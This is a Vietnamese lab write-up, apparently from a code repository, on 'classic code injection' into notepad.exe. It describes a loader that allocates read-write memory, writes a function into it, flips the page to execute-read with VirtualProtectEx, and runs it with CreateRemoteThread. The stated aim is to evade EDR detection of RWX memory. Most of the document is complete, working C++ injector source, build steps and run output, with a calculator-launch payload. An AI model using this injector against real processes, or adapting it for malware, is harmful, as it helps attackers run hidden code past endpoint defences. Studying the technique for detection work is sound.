
---

# 📝 [PE 04] Classic Code Injection — VirtualProtect

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Classic Code Injection kết hợp sửa đổi thuộc tính trang nhớ (Memory Protection Alteration)** đại diện cho mô hình cải tiến thuộc phân hệ **Né tránh phòng thủ động (Dynamic Evasion / Memory Anti-Forensics)**.

Hầu hết các giải pháp Endpoint Detection and Response (EDR) hiện đại đều thiết lập các bộ lọc hành vi (Behavioral Filters) và bẫy giám sát (User-mode API Hooks) nghiêm ngặt tại các hàm API cấp phát bộ nhớ ảo. Nếu một tiến trình phát ra yêu cầu khởi tạo một phân vùng ảo mang sẵn thuộc tính cấu hình **`PAGE_EXECUTE_READWRITE` (RWX)** chéo tiến trình, EDR Engine sẽ ngay lập tức phân loại đây là chỉ dấu nguy hiểm (Anomalous Memory Allocation), kích hoạt cơ chế ngăn chặn.

Giải thuật của dự án PE 04 hóa giải rào cản trên bằng chiến thuật **Phân rã chu kỳ sống của trang bộ nhớ (Memory Lifecycle Decoupling)**. Ban đầu, Loader chỉ yêu cầu cấp phát một trang nhớ mang quyền Đọc/Ghi (**`PAGE_READWRITE` - RW**) hợp pháp để nạp dữ liệu, sau đó mới tận dụng hàm Native Subsystem **`VirtualProtectEx`** để lật cờ bảo vệ sang thuộc tính Thực thi (**`PAGE_EXECUTE_READ` - RX**) ngay trước khi phân phối dòng chảy CPU.

### 🎯 Mục tiêu nghiên cứu:

* **Vô hiệu hóa bộ lọc Heuristic RAM**: Né tránh cơ chế quét đặc quyền trang nhớ mập mờ (RWX Hunting) của các giải pháp an ninh tại thời điểm phân bổ.
* **Làm chủ cơ chế Memory Protection Constants**: Nghiên cứu cấu trúc quản lý thuộc tính bảo vệ trang bộ nhớ ảo của Windows Subsystem tại thời điểm runtime.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Hệ điều hành Windows quản lý quyền hạn thực thi, đọc, ghi của từng trang bộ nhớ ảo thông qua cấu trúc Bảng trang (Page Tables) được thiết lập trong bộ nhớ RAM và được xử lý trực tiếp bởi phần cứng MMU của CPU. Giải thuật phân rã chu kỳ sống trang nhớ được điều phối ngầm qua 4 bước cấu trúc kịch khung:

```
[VirtualAllocEx: Phân bổ trang nhớ ngụy trang quyền RW]
       └──> [WriteProcessMemory: Ánh xạ logic mã máy tĩnh]
                 └──> [VirtualProtectEx: Lật cờ Bảng trang sang thuộc tính RX]
                           └──> [CreateRemoteThread: Khai hỏa Thread Context]

```

1. **Ngụy trang phân vùng dữ liệu ảo (`VirtualAllocEx`)**: Loader gửi yêu cầu xuống Kernel xin cấp phát một vùng nhớ chéo tiến trình mang cờ thuộc tính `PAGE_READWRITE`. Đối với hệ thống giám sát hành vi của EDR, đây là hành vi khởi tạo phân vùng chứa dữ liệu thông thường (như nạp bộ đệm văn bản, khởi tạo mảng) của các ứng dụng chuẩn chỉ, do đó cấu trúc này hoàn toàn vượt qua vòng thẩm duyệt hành vi sơ khởi.
2. **Nạp dữ liệu cấu trúc tĩnh (`WriteProcessMemory`)**: Loader tiến hành sao chép mảng byte dữ liệu tuyệt đối toán học và khối mã máy phẳng vào phân vùng mang quyền `RW` vừa tạo. Tại thời điểm này, khối mã máy ký sinh hoàn toàn bất động và không có khả năng kích nổ luồng. Nếu con trỏ lệnh CPU vô tình nhảy vào tọa độ này, cơ chế bảo vệ phần cứng **Data Execution Prevention (DEP)** của bộ vi xử lý sẽ ngay lập tức chặn đứng và sụp đổ tiến trình (`Access Violation - 0xC0000005`).
3. **Mở khóa cờ thực thi động (`VirtualProtectEx`)**: Ngay trước khi phân phối dòng chảy CPU, Loader phát lệnh yêu cầu Windows Kernel can thiệp vào cấu trúc bảng quản lý bộ nhớ của tiến trình đích, lật cờ bảo vệ của phân vùng từ `PAGE_READWRITE` sang **`PAGE_EXECUTE_READ` (RX)**. Lúc này, trang nhớ chính thức biến đổi thành một phân đoạn mã máy hợp pháp, triệt tiêu hoàn toàn dấu vết của cấu trúc `RWX` mập mờ.
4. **Triệu hồi Thread Context từ xa (`CreateRemoteThread`)**: Kernel Windows khởi tạo một luồng thực thi phụ inside tiến trình đích, bốc tọa độ phân vùng `RX` nạp vào thanh ghi chỉ mục lệnh **`Rip`** để CPU bắt đầu chu kỳ rút lệnh xử lý Payload.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn tuân thủ nghiêm ngặt nguyên lý thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** và bóc tách cấu trúc dữ liệu tuyệt đối nhằm triệt tiêu lỗi dịch chuyển địa chỉ tương đối (RIP-Relative Error).

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(lib, "user32.lib")

// Bộ quét RAM động tìm PID thích ứng theo tên tiến trình (Không phân biệt chữ hoa/thường)
DWORD GetTargetProcessPID(const std::wstring& procName) {
    DWORD pid = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            // Tự động hóa đối chiếu hoa thường để detect Notepad.exe chính xác
            if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return pid;
}

// 1. Định nghĩa cấu trúc con trỏ hàm tuyệt đối để xử lý độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm đích gánh logic thực thi độc lập vị trí
DWORD WINAPI RemoteLaunchCalculatorVP(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 04: CLASSIC CODE INJECTION REMOTE WITH VP" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetName = L"notepad.exe";
    DWORD dwPID = GetTargetProcessPID(targetName);

    if (dwPID == 0) {
        MessageBoxA(NULL, "[-] Target process not found! Please open Notepad first.", "Error", MB_OK | MB_ICONERROR);
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << dwPID << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwPID);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed!" << std::endl;
        return EXIT_FAILURE;
    }

    SIZE_T functionSize = 500; // Kích thước ước tính an toàn cho thân hàm

    // ─── BƯỚC 1: CẤP PHÁT BỘ NHỚ AN TOÀN PAGE_READWRITE (CHƯA CÓ QUYỀN THỰC THI) ───
    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteCodeBuffer) {
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Phan vung Code khoi tao voi quyen RW tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Cấp phát phân vùng dữ liệu tham số mang quyền RW từ xa
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteData) {
        VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 2: GHI MÃ MÁY VÀ DỮ LIỆU VÀO VÙNG NHỚ THÔ THÔNG THƯỜNG ───
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPVOID)RemoteLaunchCalculatorVP, functionSize, NULL);
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Day logic ham va cau truc tham so sang RAM Notepad hoan tat." << std::endl;

    // ─── BƯỚC 3: ĐỘT PHÁ QUYỀN HẠN - LẬT THUỘC TÍNH TRANG NHỚ SANG RX ───
    DWORD oldProtect = 0;
    std::cout << "[*] Dang dung VirtualProtectEx de lat quyen trang nho Code sang RX..." << std::endl;

    if (VirtualProtectEx(hProcess, remoteCodeBuffer, functionSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cout << "[+] Lat quyen trang nho thanh cong! Quyen cu: 0x" << std::hex << oldProtect << std::endl;

        // ─── BƯỚC 4: TẠO LUỒNG TỪ XA KÍCH NỔ KHI TRANG NHỚ ĐÃ HỢP LỆ ───
        std::cout << "[*] Dang khoi tao luong CreateRemoteThread de khai hoa..." << std::endl;
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, pRemoteData, 0, NULL);

        if (hThread) {
            // Đợi luồng hoàn thành chu kỳ xử lý mở Máy tính, phá băng nghẽn luồng Windows 11
            WaitForSingleObject(hThread, INFINITE);
            std::cout << "[+] Luong Thread tu xa da hoan thanh nhiem vu." << std::endl;
            CloseHandle(hThread);
        }
        else {
            std::cerr << "[-] CreateRemoteThread failed! Error: " << std::dec << GetLastError() << std::endl;
        }
    }
    else {
        std::cerr << "[-] VirtualProtectEx that bai! Ma loi: " << std::dec << GetLastError() << std::endl;
    }

    // ─── BƯỚC 5: GIẢI PHÓNG TÀI NGUYÊN CHỐNG MEMORY LEAK ───
    VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "[+] Quy trinh giai phong RAM tu xa hoan tat." << std::endl;
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hợp Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm cấu trúc file nhị phân vận hành độc lập tuyến tính, loại bỏ các lỗi thiếu thư viện runtime khi phân phối sang các môi trường máy ảo VM sạch hoặc Sandbox kiểm thử chuyên sâu:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến mục: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thuộc tính `Runtime Library`, cấu hình cờ **`Multi-threaded (/MT)`** để nhúng tĩnh (Static Linkage) toàn bộ thư viện hệ thống lọt lòng file thực thi `.exe`.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng lỗi phân rã chuỗi.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng vỏ bọc `Notepad.exe` trên môi trường máy Lab, sau đó kích hỏa tệp tin `.exe` thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm theo dõi ma trận lật cờ bảo vệ trang nhớ:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE01_Classic_Code_Injection_Local\x64\Release> C:\Users\Admin\source\repos\Task6\PE04_Classic_Code_Injection_Remote_VP\x64\Release\Classic_Code_Injection_Remote_VP.exe
====================================================
[*] PE 04: CLASSIC CODE INJECTION REMOTE WITH VP
====================================================
[+] Da tim thay Notepad.exe voi PID: 4556
[+] Phan vung Code khoi tao voi quyen RW tai: 0x0000028628300000
[+] Day logic ham va cau truc tham so sang RAM Notepad hoan tat.
[*] Dang dung VirtualProtectEx de lat quyen trang nho Code sang RX...
[+] Lat quyen trang nho thanh cong! Quyen cu: 0x4
[*] Dang khoi tao luong CreateRemoteThread de khai hoa...
[+] Luong Thread tu xa da hoan thanh nhiem vu.
[+] Quy trinh giai phong RAM tu xa hoan tat.

```

# Demo
<img width="1920" height="1080" alt="devenv_8pZPtZUiqZ" src="https://github.com/user-attachments/assets/ce4f533d-a5fd-4a05-a11f-0764234734d6" />


### 🎯 Phân tích hệ quả cấu trúc RAM:

* Chỉ số cờ bảo vệ cũ hiển thị giá trị **`0x4`** (tương ứng với hằng số thuộc tính `PAGE_READWRITE` của cấu trúc Windows API), minh chứng vùng nhớ ban đầu được khởi tạo ở trạng thái phẳng sạch, ngụy trang hoàn hảo.
* Lệnh lật cờ thực thi hoàn tất, trả về trạng thái mở khóa `RX` thành công. Ứng dụng Máy tính `calc.exe` bật bung hiên ngang tại runtime dưới danh nghĩa luồng phụ của Notepad, bẻ gãy hoàn toàn cơ chế trinh sát cờ `RWX` mập mờ kịch trần kịch khung!

---
